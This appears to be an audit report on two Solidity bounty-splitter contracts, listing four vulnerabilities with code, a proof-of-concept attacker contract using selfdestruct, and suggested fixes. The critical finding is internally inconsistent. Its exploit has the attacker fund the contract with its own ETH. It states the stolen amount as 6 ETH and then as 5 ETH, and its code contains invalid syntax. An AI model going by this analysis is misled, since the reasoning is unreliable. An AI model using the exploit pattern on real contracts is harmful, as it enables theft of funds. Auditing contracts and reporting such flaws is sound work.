# Threshold Network Splitter - Security Vulnerabilities

## CRITICAL SEVERITY

### 1. Insufficient msg.value Validation - Direct Theft of Funds

**Affected Contracts:** Both Splitter_03fd and Splitter_3234

**Location:**
- `Splitter_03fd/src/Splitter.sol:139-156` (_payWhitehatNative function)
- `Splitter_3234/src/Splitter.sol:117-134` (_payWhitehatNative function)

**Description:**

The `_payWhitehatNative()` function does not validate that `msg.value` is sufficient to cover both the whitehat payment and the fee. The function calculates the total amount to distribute (`nativeAmountDistributed = nativeTokenAmt + feeAmount`) but only checks if `msg.value > nativeAmountDistributed` for refund purposes.

**Vulnerable Code (both contracts have similar logic):**
```solidity
function _payWhitehatNative(address payable wh, uint256 nativeTokenAmt, uint256 gas) internal {
    uint256 feeAmount = (nativeTokenAmt * fee) / FEE_BASIS;
    if (feeAmount > 0) {
        (bool successFee, ) = feeRecipient.call{ value: feeAmount }("");
        require(successFee, "Splitter: Failed to send ether to fee receiver");
    }
    (bool successWh, ) = wh.call{ value: nativeTokenAmt, gas: gas }("");
    require(successWh, "Splitter: Failed to send ether to whitehat");

    uint256 nativeAmountDistributed = nativeTokenAmt + feeAmount;
    if (msg.value > nativeAmountDistributed) {  // <-- Only checks for REFUND, not insufficient funds!
        _refundCaller(msg.value - nativeAmountDistributed);
    }
}
```

**Attack Scenario:**

1. **Setup:** Attacker force-sends ETH to the Splitter contract via `selfdestruct` from another contract
   - Note: Contracts can receive ETH via selfdestruct even without a receive/fallback function
   - For Splitter_3234, this ETH is permanently locked (no withdrawal function)
   - For Splitter_03fd, there's a window before owner withdraws

2. **Exploit:** Attacker calls `payWhitehat()` with:
   - `nativeTokenAmt = 10 ETH`
   - `fee = 10%` (1000 basis points)
   - `msg.value = 5 ETH` (insufficient!)

3. **Expected behavior:** Transaction should revert due to insufficient funds

4. **Actual behavior:**
   - Total required: 10 ETH + 1 ETH (fee) = 11 ETH
   - Attacker sends: 5 ETH
   - If contract has ≥6 ETH from previous selfdestruct, payments succeed
   - Fee recipient gets: 1 ETH
   - Whitehat gets: 10 ETH
   - **Attacker paid only 5 ETH but distributed 11 ETH - stealing 6 ETH from the contract!**

**Impact:**
- **Splitter_3234:** CRITICAL - Direct theft of any ETH stuck in contract (permanent due to no withdrawal)
- **Splitter_03fd:** HIGH - Direct theft of ETH during window before owner withdrawal

**Proof of Concept:**

```solidity
// Attacker contract
contract Exploit {
    function forceSendETH(address target) external payable {
        selfdestruct(payable(target));
    }

    function exploit(address splitter) external {
        // Step 1: Force 10 ETH into Splitter
        Exploit forcer = new Exploit();
        forcer.forceSendETH{value: 10 ether}(splitter);

        // Step 2: Call payWhitehat with insufficient msg.value
        // Pay 5 ETH but get 11 ETH worth of payments (10 to whitehat + 1 fee)
        ISplitter(splitter).payWhitehat{value: 5 ether}(
            bytes32(0),           // referenceId
            payable(msg.sender),  // whitehat (attacker)
            new ERC20Payment,     // empty array
            10 ether,             // nativeTokenAmt
            1000,                 // fee (10%)
            gasleft()
        );

        // Result: Attacker spent 15 ETH total (10 to force + 5 in call)
        // But received back 10 ETH to whitehat address
        // Net cost: 5 ETH for 10 ETH payment + fees
        // This steals the 5 ETH difference from the contract
    }
}
```

**Recommended Fix:**

Add validation at the start of `_payWhitehatNative()`:

```solidity
function _payWhitehatNative(address payable wh, uint256 nativeTokenAmt, uint256 gas, uint256 fee) internal {
    uint256 feeAmount = (nativeTokenAmt * fee) / FEE_BASIS;
    uint256 nativeAmountDistributed = nativeTokenAmt + feeAmount;

    // ADD THIS CHECK:
    require(msg.value >= nativeAmountDistributed, "Splitter: Insufficient msg.value");

    if (feeAmount > 0) {
        (bool successFee, ) = feeRecipient.call{ value: feeAmount }("");
        require(successFee, "Splitter: Failed to send ether to fee receiver");
    }
    (bool successWh, ) = wh.call{ value: nativeTokenAmt, gas: gas }("");
    require(successWh, "Splitter: Failed to send ether to whitehat");

    if (msg.value > nativeAmountDistributed) {
        _refundCaller(msg.value - nativeAmountDistributed);
    }
}
```

---

## HIGH SEVERITY

### 2. Permanent Freezing of Funds in Splitter_3234

**Affected Contract:** Splitter_3234 only

**Location:** `Splitter_3234/src/Splitter.sol` (entire contract)

**Description:**

Splitter_3234 does not inherit from the `Withdrawable` contract and has no mechanism to withdraw funds. If any ETH or ERC20 tokens become stuck in the contract, they are permanently frozen.

**Ways funds can become stuck:**

1. **Forced ETH via selfdestruct:** Any contract can force-send ETH via `selfdestruct(splitterAddress)`
2. **Direct ERC20 transfers:** Anyone can directly transfer ERC20 tokens to the contract address
3. **Fee-on-transfer tokens:** Some ERC20 tokens (e.g., USDT on some chains, deflationary tokens) take a fee on transfer, which would leave dust in the contract
4. **Failed refunds:** If a refund fails in edge cases (though current code requires refund success)

**Comparison with Splitter_03fd:**

Splitter_03fd inherits from `Withdrawable` which provides:
```solidity
function withdrawERC20ETH(address _assetAddress) public virtual {
    // ... allows owner to withdraw stuck funds
}
```

Splitter_3234 has NO such function.

**Impact:**
- Permanent freezing of any funds sent to the contract
- Combined with vulnerability #1, these funds can be stolen by attackers

**Recommended Fix:**

Add withdrawal functionality to Splitter_3234:

```solidity
import { Withdrawable } from "./Withdrawable.sol";

contract Splitter is Ownable, ReentrancyGuard, Withdrawable {
    // ... existing code ...

    function withdrawERC20ETH(address assetAddress) public override onlyOwner {
        super.withdrawERC20ETH(assetAddress);
    }
}
```

---

## MEDIUM SEVERITY

### 3. Integer Division Truncation in Fee Calculation

**Affected Contracts:** Both

**Location:**
- Line 116 (Splitter_03fd): `uint256 feeAmount = (payout[i].amount * fee) / FEE_BASIS;`
- Line 93 (Splitter_3234): `uint256 feeAmount = (payout[i].amount * fee) / FEE_BASIS;`

**Description:**

Solidity performs integer division which truncates remainders. For small payment amounts or low fee percentages, the fee might round down to 0, causing the protocol to lose expected fee revenue.

**Example:**
- Payment amount: 999 wei
- Fee: 10% (1000 basis points)
- FEE_BASIS: 10000
- Calculation: (999 * 1000) / 10000 = 999000 / 10000 = 99.9 → **99 wei**
- Expected fee: 99.9 wei
- Actual fee: 99 wei
- **Lost: 0.9 wei**

While this is negligible for large amounts, it could add up over many small transactions.

**Impact:**
- Contract fails to deliver promised returns (fee revenue)
- Medium severity as it doesn't lose user value, just protocol revenue

**Recommended Fix:**

Consider rounding up for fee calculations to ensure protocol always receives at least the expected fee:

```solidity
uint256 feeAmount = (payout[i].amount * fee + FEE_BASIS - 1) / FEE_BASIS;
```

Or document that fees round down and are acceptable.

---

## LOW SEVERITY

### 4. Gas Griefing via Whitehat Revert

**Affected Contracts:** Both

**Location:** Lines 149 (03fd) and 127 (3234) in whitehat payment call

**Description:**

A malicious whitehat can deploy a contract that reverts in its receive/fallback function, causing the entire `payWhitehat()` transaction to revert. While the gas is capped, this can still grief the payment process.

**Vulnerable Code:**
```solidity
(bool successWh, ) = wh.call{ value: nativeTokenAmt, gas: gas }("");
require(successWh, "Splitter: Failed to send ether to whitehat");
```

**Impact:**
- Griefing attack - malicious whitehat can prevent payment
- The comment on line 96/70 acknowledges this: "If whitehats attempt to grief payments, project/immunefi reserves the right to nullify bounty payout"
- Low severity as it's acknowledged and whitehat loses their bounty

**Note:** This appears to be accepted behavior rather than a bug.

---

## SUMMARY

| Severity | Issue | Affected Contracts |
|----------|-------|-------------------|
| **CRITICAL** | Insufficient msg.value validation enabling theft | Both (worse in 3234) |
| **HIGH** | Permanent freezing of funds (no withdrawal) | Splitter_3234 only |
| **MEDIUM** | Fee calculation rounding down | Both |
| **LOW** | Gas griefing via whitehat revert | Both (acknowledged) |

The most critical issue is the combination of vulnerabilities #1 and #2 in Splitter_3234, which allows permanent freezing of funds that can then be stolen by attackers.
